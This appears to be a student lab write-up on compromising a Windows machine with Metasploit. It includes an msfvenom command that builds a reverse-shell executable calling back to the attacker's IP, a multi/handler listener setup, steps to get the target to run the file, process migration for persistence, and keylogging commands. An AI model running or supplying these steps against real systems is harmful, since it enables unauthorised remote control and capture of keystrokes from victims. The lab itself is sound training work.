# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

![WhatsApp Image 2025-11-19 at 23 48 35_35774df2](https://github.com/user-attachments/assets/48d45597-ae6e-4214-9723-c0d2f516d210)


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="1920" height="412" alt="ss2" src="https://github.com/user-attachments/assets/46cc6410-a9d6-4c6a-98e3-0e586b488730" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

![WhatsApp Image 2025-11-20 at 00 12 35_9a7bf51c](https://github.com/user-attachments/assets/97cf23ed-a4cf-4af5-8814-6793ae09bc8d)


Start apache server
sudo systemctl apache2 start
## OUTPUT:

![WhatsApp Image 2025-11-20 at 00 24 04_0a220e5e](https://github.com/user-attachments/assets/187e974a-c416-4eb8-b676-ede37cfc60ed)

Check the status of apache2
## OUTPUT:

<img width="1023" height="135" alt="Screenshot 2025-11-20 001901" src="https://github.com/user-attachments/assets/3d588845-7191-42a9-a6df-27360733ef62" />

Invoke msfconsole:
## OUTPUT:

![WhatsApp Image 2025-11-20 at 00 06 10_cdaaff32](https://github.com/user-attachments/assets/00e922af-fe34-4c93-b8ff-1efee2c98ba5)




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="1266" height="685" alt="Screenshot 2025-11-19 190831" src="https://github.com/user-attachments/assets/9adf105e-e4b5-4fc9-9618-0d427b00f191" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="1122" height="149" alt="Screenshot 2025-11-19 200029" src="https://github.com/user-attachments/assets/06e956bf-9c47-419f-97ce-6360cfe5fd06" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="1178" height="375" alt="Screenshot 2025-11-19 202636" src="https://github.com/user-attachments/assets/8b632f10-a004-47b7-b642-b23268b5050d" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="1023" height="135" alt="Screenshot 2025-11-20 001901" src="https://github.com/user-attachments/assets/7ea48d23-2d60-4f52-8292-dfa0fb1391c5" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
